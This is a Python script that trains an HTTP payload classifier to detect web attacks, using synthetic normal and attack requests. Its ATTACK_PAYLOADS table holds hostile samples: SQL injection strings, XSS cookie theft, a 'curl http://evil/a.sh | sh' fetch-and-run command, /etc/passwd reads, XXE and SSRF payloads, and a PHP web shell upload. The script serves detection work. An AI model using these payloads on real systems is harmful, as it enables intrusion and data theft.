from __future__ import annotations

import argparse
import json
import random
from collections import Counter
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Tuple
from urllib.parse import quote_plus

import joblib
import pandas as pd
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import accuracy_score, classification_report, confusion_matrix, f1_score
from sklearn.model_selection import train_test_split
from sklearn.pipeline import Pipeline

from security_detection_v2 import extract_request_from_record, is_simple_page_view, payload_model_text

PROJECT_ROOT = Path(__file__).resolve().parent.parent
DEFAULT_OUT = PROJECT_ROOT / "output" / "detection_v2"
DEFAULT_MODEL = PROJECT_ROOT / "models" / "payload_model_v2.joblib"
SERVER_ROWS = PROJECT_ROOT / "output" / "server_all_joined_rows.json"

NORMAL_PATHS = ["/", "/login", "/sql", "/xss", "/upload", "/command", "/traversal", "/ssrf", "/xxe", "/deserialize", "/graphql", "/ssti", "/bruteforce", "/api/products", "/api/search", "/api/profile", "/assets/app.js", "/favicon.ico"]
NORMAL_QUERIES = ["hello", "admin", "report", "测试", "product 123", "status ok", "select a city", "union station", "script writing", "orange and apple"]
NORMAL_USERNAMES = ["admin", "user", "guest", "alice", "bob", "operator", "security", "test01", "zhangsan", "lisi"]
NORMAL_PASSWORDS = [
    "admin",
    "123456",
    "wrongpass",
    "hello2026",
    "correct-password",
    "P@ssw0rd2026!",
    "ExamplePass2026",
    "Qwer1234!",
    "summer2026",
    "normal_login_001",
]
USER_AGENTS = ["Mozilla/5.0", "Chrome/126.0", "Edge/126.0", "curl/8.0", "PostmanRuntime/7.37", "python-requests/2.31"]

ATTACK_PAYLOADS = {
    "SQL注入": ["' or 1=1 -- ", "admin'--", "' UNION SELECT username,password FROM users--", "1 AND SLEEP(3)", "1' OR 'a'='a", "1;SELECT * FROM information_schema.tables", "1' and extractvalue(1,concat(0x7e,user()))--"],
    "XSS": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(document.cookie)", "<svg onload=alert(1)>", "\"><script>fetch('/cookie')</script>", "<body onload=confirm(1)>"] ,
    "命令注入": ["127.0.0.1;whoami", "127.0.0.1 && cat /etc/passwd", "localhost | powershell -enc AAA", "8.8.8.8`id`", "test$(uname -a)", "127.0.0.1; curl http://evil/a.sh | sh"],
    "路径遍历": ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "....//....//etc/passwd", "/var/www/../../etc/shadow"],
    "SSRF": ["http://127.0.0.1:8080/admin", "http://localhost/server-status", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd", "http://192.168.1.1/config"],
    "XXE": ["<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><x>&xxe;</x>", "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://evil/xxe\"> ]><foo>&xxe;</foo>"],
    "SSTI": ["{{7*7}}", "{{config.__class__}}", "${7*7}", "{{''.__class__.__mro__[1].__subclasses__()}}"],
    "危险文件上传": ["filename=cmd.php\r\nContent-Type: application/x-php\r\n\r\n<?php system($_GET['cmd']); ?>", "filename=shell.phtml", "filename=shell.jsp\r\nContent-Type: application/octet-stream", "filename=run.ps1\r\nWrite-Host pwned"],
    "反序列化": ["rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", "aced000573720011", "O:8:\"Exploit\":1:{s:3:\"cmd\";s:6:\"whoami\";}", "pickle.loads(base64.b64decode(payload))"],
    "GraphQL探测": ["{__schema{types{name}}}", "query IntrospectionQuery { __schema { queryType { name } } }", "{__type(name:\"User\"){fields{name}}}"],
}

ATTACK_ENDPOINTS = {
    "SQL注入": [("POST", "/api/auth/login", "json", "password"), ("GET", "/api/item?id={payload}", "query", "id"), ("GET", "/api/search?q={payload}", "query", "q")],
    "XSS": [("GET", "/api/search?q={payload}", "query", "q"), ("POST", "/api/comment", "json", "content")],
    "命令注入": [("POST", "/api/system/ping", "json", "host"), ("GET", "/api/tools/lookup?host={payload}", "query", "host")],
    "路径遍历": [("GET", "/api/file/read?path={payload}", "query", "path"), ("GET", "/download?file={payload}", "query", "file")],
    "SSRF": [("POST", "/api/fetch", "json", "url"), ("GET", "/api/proxy?url={payload}", "query", "url")],
    "XXE": [("POST", "/api/xml/import", "xml", "xml")],
    "SSTI": [("POST", "/api/template/render", "json", "template"), ("GET", "/api/render?name={payload}", "query", "name")],
    "危险文件上传": [("POST", "/api/upload", "multipart", "file")],
    "反序列化": [("POST", "/api/object/load", "json", "payload")],
    "GraphQL探测": [("POST", "/graphql", "json", "query")],
}


def make_record(method: str, uri: str, body: str = "", content_type: str = "", status_code: int = 200, source_ip: str = "10.0.0.8") -> Dict:
    host = random.choice(["ctf.ski:4000", "example.local", "127.0.0.1:4000"])
    ua = random.choice(USER_AGENTS)
    headers = [f"{method} {uri} HTTP/1.1", f"Host: {host}", f"User-Agent: {ua}"]
    if content_type:
        headers.append(f"Content-Type: {content_type}")
    raw = "\n".join(headers) + "\nBody:\n" + (body or "")
    return {"method": method, "uri": uri, "host": host, "status_code": status_code, "content_type": content_type, "user_agent": ua, "request_content": raw, "request_text_summary": f"METHOD={method}\nURI={uri}\nHOST={host}\nCONTENT_TYPE={content_type}\nSTATUS_CODE={status_code}\nREQUEST_BODY={body}", "source_ip": source_ip, "attack_ip": source_ip}


def render_attack(label: str, payload: str) -> Dict:
    method, endpoint, kind, field = random.choice(ATTACK_ENDPOINTS[label])
    if kind == "query":
        uri = endpoint.format(payload=quote_plus(payload))
        return make_record(method, uri, "", "", random.choice([200, 400, 500]))
    if kind == "json":
        body = json.dumps({field: payload, "username": "admin"}, ensure_ascii=False)
        return make_record(method, endpoint, body, "application/json", random.choice([200, 401, 500]))
    if kind == "xml":
        return make_record(method, endpoint, payload, "application/xml", random.choice([200, 400, 500]))
    if kind == "multipart":
        body = "------WebKitFormBoundary\nContent-Disposition: form-data; name=\"file\"; " + payload
        return make_record(method, endpoint, body, "multipart/form-data; boundary=----WebKitFormBoundary", random.choice([200, 400]))
    return make_record(method, endpoint, payload)


def generate_synthetic(seed: int, normal_n: int, per_attack_n: int) -> List[Tuple[str, str, Dict]]:
    random.seed(seed)
    samples: List[Tuple[str, str, Dict]] = []
    for _ in range(normal_n):
        path = random.choice(NORMAL_PATHS)
        method = random.choices(["GET", "POST"], weights=[0.75, 0.25])[0]
        if method == "GET":
            if path == "/api/search" or random.random() < 0.25:
                q = quote_plus(random.choice(NORMAL_QUERIES))
                uri = f"{path}?q={q}" if "?" not in path else path
            else:
                uri = path
            rec = make_record("GET", uri, "", "", random.choice([200, 200, 200, 404]))
        else:
            uri = random.choice(["/api/auth/login", "/api/comment", "/api/profile", "/api/upload", "/api/search"])
            body = json.dumps({"username": random.choice(NORMAL_USERNAMES), "password": random.choice(NORMAL_PASSWORDS), "content": random.choice(NORMAL_QUERIES)}, ensure_ascii=False)
            rec = make_record("POST", uri, body, "application/json", random.choice([200, 401, 403]))
        samples.append(("normal", payload_model_text(extract_request_from_record(rec)), rec))

    # Hard negatives: real login traffic contains username/password fields, but the
    # field names alone must not make the model learn "SQL injection".
    for _ in range(max(1200, normal_n // 5)):
        username = random.choice(NORMAL_USERNAMES)
        password = random.choice(NORMAL_PASSWORDS)
        body_shape = random.choice(["json", "form"])
        if body_shape == "json":
            body = json.dumps({"username": username, "password": password}, ensure_ascii=False)
            rec = make_record("POST", "/api/auth/login", body, "application/json", random.choice([200, 200, 401]))
        else:
            body = f"username={quote_plus(username)}&password={quote_plus(password)}"
            rec = make_record("POST", "/login", body, "application/x-www-form-urlencoded", random.choice([200, 302, 401]))
        samples.append(("normal", payload_model_text(extract_request_from_record(rec)), rec))
    for label, payloads in ATTACK_PAYLOADS.items():
        for _ in range(per_attack_n):
            payload = random.choice(payloads)
            # add small enc/spacing variations
            if random.random() < 0.25:
                payload = quote_plus(payload)
            rec = render_attack(label, payload)
            samples.append((label, payload_model_text(extract_request_from_record(rec)), rec))
    random.shuffle(samples)
    return samples


def load_server_hard_samples(path: Path) -> List[Tuple[str, str, Dict]]:
    if not path.exists():
        return []
    rows = json.loads(path.read_text(encoding="utf-8-sig"))
    out: List[Tuple[str, str, Dict]] = []
    for row in rows:
        ev = extract_request_from_record(row)
        uri = str(ev.get("uri") or "")
        old_type = str(row.get("attack_type") or "")
        label = None
        if is_simple_page_view(ev):
            label = "normal"
        elif "<script" in uri.lower() or "onerror" in uri.lower():
            label = "XSS"
        elif "../" in uri or "%2e%2e" in uri.lower() or "etc/passwd" in uri.lower():
            label = "路径遍历"
        elif any(x in (ev.get("body") or "").lower() for x in [" or 1=1", "union select", "sleep(", "information_schema"]):
            label = "SQL注入"
        elif any(x in (ev.get("body") or "").lower() for x in ["whoami", "cat /etc/passwd", "powershell", ";", "&&"]):
            label = "命令注入"
        elif "SQL" in old_type and not is_simple_page_view(ev):
            label = "SQL注入"
        if label:
            out.append((label, payload_model_text(ev), row))
    return out


def main() -> None:
    parser = argparse.ArgumentParser(description="Train v2 HTTP payload model")
    parser.add_argument("--output-dir", default=str(DEFAULT_OUT))
    parser.add_argument("--model-out", default=str(DEFAULT_MODEL))
    parser.add_argument("--normal-n", type=int, default=8000)
    parser.add_argument("--per-attack-n", type=int, default=1200)
    parser.add_argument("--seed", type=int, default=42)
    args = parser.parse_args()

    out_dir = Path(args.output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)
    model_out = Path(args.model_out)
    model_out.parent.mkdir(parents=True, exist_ok=True)

    samples = generate_synthetic(args.seed, args.normal_n, args.per_attack_n)
    server_samples = load_server_hard_samples(SERVER_ROWS)
    # oversample server hard negatives/positives because they represent the real failure mode.
    samples.extend(server_samples * 3)
    labels = [x[0] for x in samples]
    texts = [x[1] for x in samples]

    X_train, X_test, y_train, y_test = train_test_split(texts, labels, test_size=0.22, random_state=args.seed, stratify=labels)
    model = Pipeline([
        ("tfidf", TfidfVectorizer(analyzer="char", ngram_range=(3, 5), min_df=2, max_features=90000, lowercase=True)),
        ("clf", LogisticRegression(max_iter=2500, class_weight="balanced", C=4.0, n_jobs=None)),
    ])
    model.fit(X_train, y_train)
    pred = model.predict(X_test)
    acc = accuracy_score(y_test, pred)
    macro_f1 = f1_score(y_test, pred, average="macro")
    report = classification_report(y_test, pred, digits=4, zero_division=0)
    cm = confusion_matrix(y_test, pred, labels=sorted(set(labels)))

    bundle = {
        "version": "payload_model_v2_2026_07_01",
        "created_at": datetime.now().isoformat(timespec="seconds"),
        "model": model,
        "labels": sorted(set(labels)),
        "metrics": {"accuracy": acc, "macro_f1": macro_f1, "sample_count": len(samples), "server_hard_sample_count": len(server_samples)},
        "notes": "TF-IDF char ngram + LogisticRegression, trained with synthetic Web payloads and server hard negatives.",
    }
    joblib.dump(bundle, model_out)

    raw_df = pd.DataFrame({"label": labels, "text": texts})
    raw_df.to_csv(out_dir / "payload_model_v2_training_samples.csv", index=False, encoding="utf-8-sig")
    (out_dir / "classification_report.txt").write_text(report, encoding="utf-8")
    (out_dir / "metrics.json").write_text(json.dumps(bundle["metrics"], ensure_ascii=False, indent=2), encoding="utf-8")
    pd.DataFrame(cm, index=sorted(set(labels)), columns=sorted(set(labels))).to_csv(out_dir / "confusion_matrix.csv", encoding="utf-8-sig")
    (out_dir / "label_counts.json").write_text(json.dumps(Counter(labels), ensure_ascii=False, indent=2), encoding="utf-8")

    print("model:", model_out)
    print("samples:", len(samples), "server_hard:", len(server_samples))
    print("accuracy:", round(acc, 5), "macro_f1:", round(macro_f1, 5))
    print(report)


if __name__ == "__main__":
    main()

